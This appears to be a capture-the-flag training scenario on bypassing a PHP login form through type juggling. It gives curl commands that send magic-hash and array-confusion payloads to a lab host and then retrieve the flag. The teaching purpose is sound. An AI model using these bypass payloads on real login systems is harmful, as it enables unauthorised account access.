# Scenario 26 — PHP type juggling login bypass

**Difficulty:** 🟡 | **Time:** ~20 min | **Domains:** 13, 14
**Tools:** `curl`, Burp, [ffuf](../../tools/ffuf.md)

## Story
Target 10.10.10.26 hosts a PHP login form that compares user-supplied hashes with `==`. Bypass it and recover the admin flag on the dashboard.

## Step 1 — Recon the login
```bash
curl -s http://10.10.10.26/login.php
```
**Expected finding:** POST form with `user`, `password` fields.

## Step 2 — Inspect source (if leaked via backup)
```bash
curl -s http://10.10.10.26/login.php.bak
```
**Expected finding:**
```php
if ($_POST['user']==$dbuser && md5($_POST['password'])==$stored_hash) { ... }
```
`==` is loose comparison — vulnerable.

## Step 3 — Understand the trick
**What we're doing:** PHP evaluates strings starting with `0e` followed only by digits as scientific notation `0 * 10^X = 0`. Two such strings are `==`-equal.

Magic hashes (md5 starts with `0e<digits>`):
- `240610708` → `0e462097431906509019562988736854`
- `QNKCDZO` → `0e830400451993494058024219903391`

## Step 4 — Send the bypass
```bash
curl -s -X POST http://10.10.10.26/login.php \
  -d "user=admin&password=240610708" -c jar.txt -L
```
**Expected finding:** Redirect to `/dashboard.php` with a session cookie.

## Step 5 — Array confusion alternative
**What we're doing:** If the code uses `strcmp($_POST['password'], $real)`, passing an array returns NULL (== 0 == match).
```bash
curl -s -X POST http://10.10.10.26/login.php \
  -d "user=admin&password[]=a"
```

## Step 6 — Grab the flag
```bash
curl -s -b jar.txt http://10.10.10.26/dashboard.php | grep -i flag
```

## Step 7 — Final answer
**Answer format:** flag string.

## Gotchas across this chain
- PHP 8+ tightened loose comparisons — string-to-int now stricter. Scenario only works on PHP ≤ 7.x.
- `===` (strict) is not vulnerable to type juggling.
- If the hash is SHA-1, use magic SHA-1 strings (`aaroZmOk`, `aaK1STfY`).
- Watch for WAF — some block `0e` explicitly.

## Variant questions this scenario teaches
- "What magic hash bypasses md5 loose comparison?"
- "Which PHP operator is vulnerable to type juggling?"
- "What is the difference between == and === in PHP?"

